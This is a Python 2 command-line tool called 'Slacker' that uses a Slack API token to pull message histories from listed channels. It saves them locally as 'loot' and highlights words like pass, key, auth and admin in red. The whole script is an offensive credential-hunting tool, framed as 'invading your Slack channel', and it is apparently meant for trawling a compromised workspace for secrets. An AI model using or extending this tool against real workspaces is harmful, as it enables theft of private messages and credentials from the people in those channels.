import requests
import time
import sys
import os
import datetime
import argparse
import re
import csv
import codecs
from colorama import Fore

URL="https://slack.com/api/channels.history"

GREEN = '\033[32m'
BLUE = '\033[94m'
ENDC = '\033[0m'


def get_args():
    parser = argparse.ArgumentParser(description="Slacker: EZ-Mode Slack Channel Message Parser",epilog="Invading your Slack channel since 2019.")
    parser.add_argument('-c','--count',type=int, help="Number of messages to display", required=True)
    parser.add_argument('-f','--file',type=str, help="Channel list file", required=True)
    parser.add_argument('-t','--token',type=str, help="Slack API token", required=True)
    parser.add_argument('-d','--dictionary',type=str, help="CSV file for correlating channel IDs to channel names.", required=True)
    args = parser.parse_args()
    count = args.count
    file = args.file
    api_token = args.token
    dictionary = args.dictionary
    return count, file, api_token, dictionary


def create_list(list_file):
    channel_file = open(list_file,'r')
    channels = channel_file.readlines()
    channel_list = []
    for item in channels:
        stripped_item = item.replace('\n','')
        channel_list.append(stripped_item)
    return channel_list


def create_dataFolder():
    if not os.path.exists(time.strftime("%Y_%m_%d")):
        os.makedirs(time.strftime("%Y_%m_%d"))


def parse_messages(channel_list,count,api_token):
    for id in channel_list:
        create_dataFolder()
        f = codecs.open(time.strftime("%Y_%m_%d/") + id_to_name(id),'a+','utf-8')
        print GREEN + "[*] Reading messages from channel " + id_to_name(id) + "." + ENDC
        s = requests.get(URL + "?token=" + api_token + "&channel=" + id + "&count=" + str(count) + "&pretty=1")
        history_count = count-1
        while history_count >= 0:
            try:
                slack_data = s.json()
                message = slack_data["messages"][history_count]["text"]
                time_stamp = slack_data["messages"][history_count]["ts"]
                f.write(BLUE + "[" + time_stamper(time_stamp) + "]" + ": " + ENDC + regex_Search(message)+"\n")
                history_count -= 1
            except IndexError:
                message = 'null'
                time_stamp = 'null'
                break
        f.close()
        time.sleep(2)


def time_stamper(ts):
    new_date = datetime.datetime.fromtimestamp(float(ts)).strftime('%c')
    return new_date


def regex_Search(text):
    regex_pattern = r'((?i)(pass|key|auth|admin))'
    highlight = Fore.RED + r'\1' + Fore.RESET
    highlighted = re.sub(regex_pattern, highlight, text)
    return highlighted


def id_to_name(id):
    channel_reader = csv.DictReader(open(dictionary, 'rb'))
    for line in channel_reader:
        values = line["ID"], line["Name"]
        if id in line["ID"]:
            id_name = line["Name"]
            return str(id_name)


if __name__=="__main__":
    count,file,api_token,dictionary = get_args()
    the_channels = create_list(file)
    parse_messages(the_channels,count,api_token)
    print GREEN + "[!] Finished parsing. Loot saved to " + time.strftime("%Y_%m_%d/") + ENDC
    sys.exit(0)
